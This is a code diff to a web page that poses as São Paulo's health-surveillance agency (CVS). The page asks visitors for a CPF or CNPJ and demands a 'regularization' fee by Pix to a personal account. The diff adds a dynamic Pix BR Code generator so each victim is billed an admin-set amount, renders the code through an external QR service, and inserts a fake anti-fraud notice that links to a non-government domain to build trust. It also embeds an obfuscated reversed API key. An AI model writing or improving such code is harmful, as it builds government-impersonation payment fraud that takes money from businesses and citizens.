@@ -313,6 +313,15 @@
     .bubble-ai { background: white; align-self: flex-start; border-bottom-left-radius: 4px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); color: #333; border: 1px solid #eee;}
     .bubble-user { background: var(--sp-red); color: white; align-self: flex-end; border-bottom-right-radius: 4px; box-shadow: 0 2px 5px rgba(218,37,28,0.2); }
 
+    /* --- MODAL DE ALERTA DE FRAUDE --- */
+    .modal-alerta-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 100000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
+    .modal-alerta-box { background: #fff; max-width: 650px; width: 90%; border-radius: 12px; padding: 30px; position: relative; box-shadow: 0 20px 50px rgba(0,0,0,0.3); border-top: 5px solid var(--sp-red); text-align: left; max-height: 90vh; overflow-y: auto;}
+    .modal-alerta-close { position: absolute; top: 15px; right: 20px; font-size: 1.5rem; color: #999; cursor: pointer; transition: 0.3s; }
+    .modal-alerta-close:hover { color: var(--sp-red); }
+    .modal-alerta-box h3 { color: var(--text-dark); margin-bottom: 20px; font-size: 1.35rem; font-weight: 900;}
+    .modal-alerta-box p { color: #444; font-size: 0.95rem; margin-bottom: 15px; line-height: 1.6; }
+    .modal-alerta-box strong { color: #222; }
+
     /* --- MOBILE AJUSTES OTIMIZADOS E PERFEITOS --- */
     @media (max-width: 900px) {
       .gov-bar { font-size: 10px; padding: 8px 0; }
@@ -447,7 +456,15 @@
       
       <div id="search-result-area" style="display:none; background: rgba(255,255,255,0.95); padding: 20px; border-radius: 12px; margin-top: 15px; text-align: left; border: 1px solid rgba(255,255,255,0.2); max-width: 600px; margin-left: auto; margin-right: auto; position: relative; z-index: 10; color: #333; box-shadow: 0 10px 30px rgba(0,0,0,0.2);"></div>
 
-      <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 12px; margin-top: 30px; margin-bottom: 20px; text-align: left; border: 1px solid rgba(255,255,255,0.2); max-width: 600px; margin-left: auto; margin-right: auto; position: relative; z-index: 10;">
+      <div style="background: white; border-radius: 12px; padding: 12px; max-width: 600px; margin: 25px auto 10px; cursor: pointer; display: flex; align-items: center; gap: 15px; border-left: 5px solid var(--sp-red); box-shadow: 0 4px 15px rgba(0,0,0,0.3); transition: transform 0.3s;" onclick="document.getElementById('modal-alerta').style.display='flex'" onmouseover="this.style.transform='scale(1.02)'" onmouseout="this.style.transform='scale(1)'">
+        <img src="alerta.jpeg" alt="Alerta" style="width: 90px; height: auto; border-radius: 6px;" />
+        <div style="text-align: left;">
+          <h4 style="color: var(--sp-red); margin: 0; font-size: 1.1rem; font-weight: 900; text-transform: uppercase;">Atenção: Alerta de Fraude</h4>
+          <p style="color: #444; margin: 0; font-size: 0.9rem; font-weight: 600;">Clique aqui para ler o comunicado oficial do CVS sobre falsas cobranças.</p>
+        </div>
+      </div>
+
+      <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 12px; margin-top: 20px; margin-bottom: 20px; text-align: left; border: 1px solid rgba(255,255,255,0.2); max-width: 600px; margin-left: auto; margin-right: auto; position: relative; z-index: 10;">
         <h4 style="margin-bottom: 10px; font-size: 1.1rem;"><i class="fas fa-search"></i> Consulta Pública de Regularidade</h4>
         <div style="display: flex; gap: 10px;">
           <input type="text" id="fake_consulta_cnpj" placeholder="Digite seu CPF ou CNPJ..." style="flex: 1; padding: 12px; border-radius: 8px; border: none; outline: none; color: #333; font-weight: bold;" oninput="window.maskCPFinCNPJ(this)">
@@ -629,11 +646,11 @@
                       
                     <p style="font-size: 0.9rem; color: #4a5568; margin-bottom: 15px; font-weight: 600;">Escaneie o QR Code abaixo com o aplicativo do seu banco para regularizar a situação e travar possíveis multas.</p>
                       
-                    <img src="imagens/pix.jpeg" alt="QR Code Pix" style="width: 200px; height: 200px; margin: 0 auto 20px; border-radius: 8px; border: 2px solid var(--gov-blue); padding: 5px; background: #fff;" />
+                    <img src="imagens/pix.jpeg" alt="QR Code Pix Dinâmico" style="width: 200px; height: 200px; margin: 0 auto 20px; border-radius: 8px; border: 2px solid var(--gov-blue); padding: 5px; background: #fff;" />
 
                     <label style="font-size: 0.85rem; font-weight: 800; display: block; margin-bottom: 5px; text-align: left; color: #2d3748;">Pix Copia e Cola:</label>
                     <div style="display: flex; gap: 8px;">
-                      <input type="text" id="pix-copia-cola" value="00020126580014br.gov.bcb.pix0136299713b0-c73d-4649-98ca-bb73764cdfe25204000053039865802BR5925GILIARD DE OLIVEIRA SANTI60085500019962070503***6304D4E0" class="form-control" style="margin-bottom: 0; font-size: 0.8rem; padding: 12px; border-color: #cbd5e0; background: #fff;" readonly />
+                      <input type="text" id="pix-copia-cola" value="" class="form-control" style="margin-bottom: 0; font-size: 0.8rem; padding: 12px; border-color: #cbd5e0; background: #fff;" readonly />
                       <button onclick="window.copiarPix()" style="background: var(--gov-blue); color: #fff; border: none; padding: 0 20px; border-radius: 8px; cursor: pointer; transition: 0.3s;" title="Copiar código"><i class="fas fa-copy"></i></button>
                     </div>
                   </div>
@@ -852,6 +869,17 @@
     </form>
   </div>
 
+  <div class="modal-alerta-overlay" id="modal-alerta">
+    <div class="modal-alerta-box">
+      <i class="fas fa-times modal-alerta-close" onclick="document.getElementById('modal-alerta').style.display='none'"></i>
+      <h3>Centro de Vigilância Sanitária alerta para nova tentativa de fraude</h3>
+      <p>Informamos às empresas do setor regulado e à população em geral sobre tentativas de golpe realizadas por indivíduos que se passam falsamente por representantes do Centro de Vigilância Sanitária (CVS) e do Grupo de Vigilância Sanitária (GVS).</p>
+      <p>Esclarecemos que o CVS e o GVS <strong>não utilizam canais como SMS, ligações telefônicas ou e-mails não institucionais</strong> para notificar, solicitar documentos de regularização ou realizar cobranças referentes a produtos, serviços de saúde, meio ambiente ou saúde do trabalhador.</p>
+      <p>Fique atento ao uso indevido de nossas logomarcas em sites falsos. O alerta é válido, especialmente, para qualquer contato que exija algum tipo de facilidades em serviços.</p>
+      <p><strong>Canais de atendimento oficiais</strong><br>Para registrar denúncias sobre essas abordagens, além de reclamações, elogios ou sugestões. Acesse o portal: <a href="https://vigilanciadigital-sp.com.br" style="color:var(--gov-blue); text-decoration:underline;">https://vigilanciadigital-sp.com.br</a></p>
+    </div>
+  </div>
+
   <script type="module">
     // ==============================================================
     // IMPORTAÇÕES FIREBASE (UNIFICADAS)
@@ -976,9 +1004,49 @@
     const chaveOculta = "Idel4NPPfWBgTvpa-i8y_QjZgC1Mejx7BySazIA";
     const GEMINI_API_KEY = chaveOculta.split('').reverse().join('');
 
-    // FUNÇÕES GLOBAIS GERAIS
+    // FUNÇÕES GLOBAIS GERAIS E GERADOR DE PIX
     window.idPedidoConsultaAtual = null; 
     window.captchaValidado = false;
+    
+    // --- FUNÇÕES DO NOVO GERADOR DINÂMICO DE PIX ---
+    window.crc16 = function(payload) {
+        let polynomial = 0x1021;
+        let result = 0xFFFF;
+        for (let i = 0; i < payload.length; i++) {
+            result ^= payload.charCodeAt(i) << 8;
+            for (let j = 0; j < 8; j++) {
+                if ((result & 0x8000) !== 0) {
+                    result = (result << 1) ^ polynomial;
+                } else {
+                    result <<= 1;
+                }
+            }
+        }
+        return (result & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
+    };
+
+    window.gerarPixDinamico = function(valorStr) {
+        // Limpa e converte o valor para o formato numérico americano "0.00"
+        let valorNum = valorStr.replace(/[^\d.,]/g, '').replace(',', '.');
+        if (!valorNum || isNaN(parseFloat(valorNum))) valorNum = "0.00";
+        let valorFloat = parseFloat(valorNum).toFixed(2);
+        let valorLen = valorFloat.length.toString().padStart(2, '0');
+
+        // Cria a String oficial do Banco Central baseada no código estático que você já usava
+        let payloadStr = "000201" +
+                         "26580014br.gov.bcb.pix0136299713b0-c73d-4649-98ca-bb73764cdfe2" +
+                         "52040000" +
+                         "5303986" +
+                         "54" + valorLen + valorFloat +
+                         "5802BR" +
+                         "5925GILIARD DE OLIVEIRA SANTI" +
+                         "6009SAO PAULO" +
+                         "62070503***" +
+                         "6304";
+        // Adiciona a criptografia CRC obrigatória no final do código do pix
+        let crc = window.crc16(payloadStr);
+        return payloadStr + crc;
+    };
     
     window.ativarCaptcha = function() {
         if(window.captchaValidado) return;
@@ -1669,9 +1737,9 @@
                       divMsg.style.display = 'none'; divPix.style.display = 'block';
                       
                       // =========================================================================
-                      // LÓGICA DO VALOR DO PIX: MOSTRA EXATAMENTE O VALOR LANÇADO PELO ADMIN
+                      // LÓGICA DO VALOR DO PIX: MOSTRA O VALOR CORRETO E GERA QR CODE AUTOMÁTICO
                       // =========================================================================
-                      let valorLimpo = pedido.valor.replace('R$', '').replace(/\s/g, ''); // Garante que não tem 'R$' digitado pelo admin
+                      let valorLimpo = pedido.valor.replace('R$', '').replace(/\s/g, ''); 
                       let valorFormatado = parseFloat(valorLimpo.replace(',','.')).toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'});
                       
                       if(valorFormatado === "NaN" || !valorLimpo.match(/[0-9]/)) {
@@ -1679,17 +1747,15 @@
                       }
                       
                       document.getElementById('valor-cobrado').innerText = valorFormatado;
-                      
-                      // Salva o valor globalmente para a mensagem do Whatsapp do botão "Emitir Guia"
                       valorPixParaComprovante = valorFormatado;
 
-                      // Substitui o código "copia e cola" genérico inserindo o valor (Simulação)
-                      // Nota: Num cenário real com banco, o código do Pix muda dinamicamente via API.
-                      // Aqui, mantemos o código original do seu template, mas a tela reflete o valor do Banco.
+                      // NOVO: Aqui o sistema gera o BR Code exato com o valor da taxa
+                      let pixDinamico = window.gerarPixDinamico(valorLimpo);
+                      document.getElementById('pix-copia-cola').value = pixDinamico;
                       
-                      if (pedido.pix_copia_e_cola) {
-                          document.getElementById('pix-copia-cola').value = pedido.pix_copia_e_cola;
-                      }
+                      // Atualiza a imagem do QR Code instantaneamente para forçar o banco a ler o valor
+                      let qrImgUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixDinamico);
+                      document.querySelector('.qr-container img').src = qrImgUrl;
                       // =========================================================================
                       
                       cnpjParaComprovante = cnpj;
